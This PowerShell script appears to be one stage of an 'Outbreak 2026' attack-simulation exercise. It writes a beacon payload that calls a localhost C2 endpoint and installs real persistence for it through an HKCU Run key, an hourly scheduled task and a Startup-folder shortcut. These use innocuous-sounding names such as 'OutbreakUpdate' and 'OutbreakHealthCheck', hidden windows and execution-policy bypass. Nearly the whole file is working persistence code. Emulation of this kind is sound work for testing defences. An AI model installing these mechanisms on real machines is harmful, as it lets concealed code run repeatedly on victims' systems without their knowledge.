<#
.SYNOPSIS
    Stage 05 — Persistence Installation (Real Actions)
.DESCRIPTION
    Installs real persistence mechanisms:
    1. Registry Run key (HKCU)
    2. Scheduled Task (hourly calc.exe as simulated beacon)
    3. Startup folder shortcut
    These are non-destructive but real persistence artifacts.
#>

Write-Host "============================================" -ForegroundColor Cyan
Write-Host " STAGE 05: PERSISTENCE INSTALLATION" -ForegroundColor Cyan
Write-Host "============================================" -ForegroundColor Cyan
Write-Host ""

$stagerPath = Join-Path $env:USERPROFILE "AppData\Local\Temp\outbreak_stage.ps1"

# ── Create the persistence payload script ──
Write-Host "[*] CREATING PERSISTENCE PAYLOAD" -ForegroundColor Yellow

$payloadContent = @'
# Outbreak 2026 — Persistence Beacon
# This is a simulated persistence payload for authorized testing.
# In a real scenario, this would beacon to C2 infrastructure.
$beaconUrl = "http://127.0.0.1:5000/beacon"
try {
    $response = Invoke-WebRequest -Uri $beaconUrl -Method GET -TimeoutSec 2 -UseBasicParsing -ErrorAction SilentlyContinue
} catch {
    # Silent fail — no C2 active
}
'@

try {
    Set-Content -Path $stagerPath -Value $payloadContent -Force
    Write-Host ('  {0} Payload created: {1}' -f $ok, $stagerPath) -ForegroundColor Green
} catch {
    Write-Host "  Could not create payload file" -ForegroundColor Red
}
Write-Host ""

# ── Registry Run Key (HKCU) ──
Write-Host "[*] INSTALLING REGISTRY RUN KEY" -ForegroundColor Yellow
$runPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
try {
    $cmd = 'powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File "' + $stagerPath + '"'
    Set-ItemProperty -Path $runPath -Name "OutbreakUpdate" -Value $cmd -Force
    Write-Host ('  {0} Registry Run key installed: HKCU\...\Run\OutbreakUpdate' -f $ok) -ForegroundColor Green
    Write-Host "      Command: $cmd" -ForegroundColor Gray
} catch {
    Write-Host "  Could not write Registry Run key" -ForegroundColor Red
}
Write-Host ""

# ── Scheduled Task ──
Write-Host "[*] INSTALLING SCHEDULED TASK" -ForegroundColor Yellow
try {
    $taskName = "OutbreakHealthCheck"
    
    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
    
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument ('-ExecutionPolicy Bypass -WindowStyle Hidden -File "' + $stagerPath + '"')
    $trigger = New-ScheduledTaskTrigger -Daily -At (Get-Date).AddMinutes(1).ToString("HH:mm") -RepetitionInterval (New-TimeSpan -Minutes 60)
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
    $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Limited
    
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force -ErrorAction SilentlyContinue
    
    # schtasks fallback - use single quotes and string concatenation to avoid quote hell
    $trArg = 'powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File "' + $stagerPath + '"'
    $schtaskCmd = "schtasks /create /tn `"$taskName`" /tr `"$trArg`" /sc hourly /mo 1 /f"
    Invoke-Expression $schtaskCmd 2>$null
    
    Write-Host ('  {0} Scheduled Task created: {1} (hourly)' -f $ok, $taskName) -ForegroundColor Green
} catch {
    Write-Host "  Could not create scheduled task" -ForegroundColor Red
}
Write-Host ""

# ── Startup Folder ──
Write-Host "[*] INSTALLING STARTUP FOLDER SHORTCUT" -ForegroundColor Yellow
try {
    $startupPath = [Environment]::GetFolderPath("Startup")
    $shortcutPath = "$startupPath\OutbreakHelper.url"
    
    $urlContent = @"
[InternetShortcut]
URL=file:///$($stagerPath.Replace('\','/'))
"@
    Set-Content -Path $shortcutPath -Value $urlContent -Force
    Write-Host ('  {0} Startup shortcut installed: {1}' -f $ok, $shortcutPath) -ForegroundColor Green
} catch {
    Write-Host "  Could not create startup shortcut" -ForegroundColor Red
}
Write-Host ""

# ── Verify ──
Write-Host "[*] VERIFICATION" -ForegroundColor Yellow

$verifyRun = Get-ItemProperty -Path $runPath -Name "OutbreakUpdate" -ErrorAction SilentlyContinue
if ($verifyRun) {
    Write-Host ('  {0} Registry Run key verified' -f $ok) -ForegroundColor Green
}

$verifyTask = Get-ScheduledTask -TaskName "OutbreakHealthCheck" -ErrorAction SilentlyContinue
if ($verifyTask) {
    Write-Host ('  {0} Scheduled Task verified: {1}' -f $ok, $verifyTask.State) -ForegroundColor Green
}

if (Test-Path $shortcutPath) {
    Write-Host ('  {0} Startup shortcut verified' -f $ok) -ForegroundColor Green
}
Write-Host ""

# ── Summary ──
Write-Host "[*] PERSISTENCE SUMMARY" -ForegroundColor Yellow
Write-Host "  Payload:   $stagerPath"
Write-Host "  Registry:  HKCU\...\Run\OutbreakUpdate"
Write-Host "  Task:      OutbreakHealthCheck (hourly)"
Write-Host "  Startup:   $shortcutPath"
Write-Host ""

Write-Host "============================================" -ForegroundColor Green
Write-Host " STAGE 05 COMPLETE" -ForegroundColor Green
Write-Host "============================================" -ForegroundColor Green